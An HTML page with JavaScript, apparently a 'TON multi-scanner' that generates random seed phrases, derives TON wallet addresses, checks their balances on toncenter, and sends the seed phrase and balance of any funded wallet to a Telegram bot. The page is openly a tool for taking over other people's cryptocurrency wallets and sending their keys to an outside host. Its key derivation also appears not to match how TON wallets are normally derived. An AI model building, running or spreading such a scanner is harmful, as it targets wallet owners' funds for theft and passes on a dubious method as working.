<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>REAL TON SCANNER v5.0</title>
    <script src="https://cdn.tailwindcss.com"></script>

    <!-- BIP39 + TONWEB -->
    <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/bip39.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tonweb@0.0.60/dist/tonweb.js"></script>

</head>

<body class="bg-black text-white font-mono p-6">

    <div class="max-w-xl mx-auto bg-[#111] p-6 rounded-2xl border border-blue-500/40">

        <h1 class="text-center text-xl font-bold text-blue-400 mb-4">
            REAL TON MULTI-SCANNER v5.0
        </h1>

        <div id="terminal" class="bg-black h-80 overflow-y-auto p-3 rounded-xl text-xs border border-slate-800"></div>

        <button id="startBtn"
            class="w-full bg-blue-600 py-3 mt-4 rounded-xl font-bold hover:bg-blue-500">
            START SCANNING
        </button>

        <button id="stopBtn"
            class="w-full bg-red-600 py-3 mt-3 rounded-xl font-bold hidden hover:bg-red-500">
            STOP
        </button>

    </div>

<script>

const tonweb = new TonWeb();
const apiUrl = "https://toncenter.com/api/v2/getAddressInformation?address=";

const BOT = {
    token: "XXXXXXXXXXXX",
    chat: "XXXXXXXXXXXX"
};

let isRunning = false;

function log(msg, color="text-slate-400") {
    const box = document.getElementById("terminal");
    const p = document.createElement("p");
    p.className = color;
    p.innerText = `[${new Date().toLocaleTimeString()}]  ${msg}`;
    box.prepend(p);
}

async function sendTelegram(msg) {
    await fetch(`https://api.telegram.org/bot${BOT.token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: BOT.chat,
            text: msg,
            parse_mode: "HTML"
        })
    });
}

async function checkWallet(mnemonic) {

    try {
        const seed = await bip39.mnemonicToSeed(mnemonic);
        const keyPair = TonWeb.utils.keyPairFromSeed(seed.slice(0, 32));

        const WalletClass = tonweb.wallet.all.v4R2;
        const wallet = new WalletClass(tonweb.provider, {
            publicKey: keyPair.publicKey
        });

        const address = await wallet.getAddress();
        const rawAddr = address.toString(true, true, true);

        const res = await fetch(apiUrl + rawAddr);
        const data = await res.json();

        if (data.ok && data.result && parseInt(data.result.balance) > 0) {
            const ton = parseInt(data.result.balance) / 1e9;

            const msg = 
`💰 <b>TON FOUND!</b>

Mnemonic:
<code>${mnemonic}</code>

Address:
<code>${rawAddr}</code>

Balance:
<b>${ton} TON</b>`;

            await sendTelegram(msg);
            log(`FOUND: ${ton} TON`, "text-green-400");

        } else {
            log(`Empty: ${rawAddr.substring(0, 12)}...`);
        }

    } catch (e) {
        log("Error scanning wallet", "text-red-500");
    }
}

async function startScan() {
    isRunning = true;

    while (isRunning) {
        const mnemonic = bip39.generateMnemonic(256); // REAL 24 WORDS
        log("Scanning...", "text-blue-500");
        await checkWallet(mnemonic);
        await new Promise(r => setTimeout(r, 400));
    }
}

document.getElementById("startBtn").onclick = () => {
    document.getElementById("stopBtn").classList.remove("hidden");
    document.getElementById("startBtn").classList.add("hidden");
    startScan();
};

document.getElementById("stopBtn").onclick = () => {
    isRunning = false;
    document.getElementById("stopBtn").classList.add("hidden");
    document.getElementById("startBtn").classList.remove("hidden");
};


</script>

</body>
</html>
